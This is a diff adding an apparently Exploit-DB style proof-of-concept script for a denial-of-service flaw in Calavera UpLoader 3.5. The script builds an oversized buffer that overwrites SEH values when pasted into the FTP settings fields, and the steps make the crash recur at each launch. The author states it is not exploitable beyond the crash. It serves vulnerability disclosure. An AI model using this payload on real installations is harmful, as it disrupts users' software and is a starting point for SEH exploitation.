@@ -1,0 +1,33 @@
+# Exploit Title: Calavera UpLoader 3.5 - 'FTP Logi' Denial of Service (PoC + SEH Overwrite)
+# Date: 2020-07-20
+# Author: Felipe Winsnes
+# Software Link: https://www.exploit-db.com/apps/463c9e7fe9a39888d3c01bc9ad756bba-UpSetup.exe
+# Version: 3.5
+# Tested on: Windows 7 (x86)
+
+# Blog: https://whitecr0wz.github.io/
+
+# Sadly enough, this vulnerability is not exploitable as there are no friendly PPR addresses available and 
+# yet the vulnerability is triggered with additional padding == can't use addresses with null values.
+
+# Proof of Concept:
+# 1.- Run the python script, it will create a new file "poc.txt".
+# 2.- Copy the content of the new file 'poc.txt' to clipboard.
+# 3.- Open the Application.
+# 4.- Click on "Settings".
+# 4.- Paste contents of the generated file into the parameters "FTP Address", "Username" and Password". Furthermore, check the box with the statement "Check to save password in preferences".
+# 5.- Crashed.
+# 6.- As uploadpref.dat is generated, every time the application opens it will crash, with the SEH values being overwritten. In order to stop this behavior simply delete the file.
+
+# If the contents are only pasted into "Password", the application will only crash once without creating uploadpref.dat.
+
+buffer = "A" * 477 + "BBBB" + "CCCC" + "\xff" * 2000
+
+try:
+    f = open ("poc.txt", "w")
+    f.write(buffer)
+    f.close()
+    print "[+] The file has been created successfully!"
+
+except:
+    print "[!] There has been an error while creating the file."
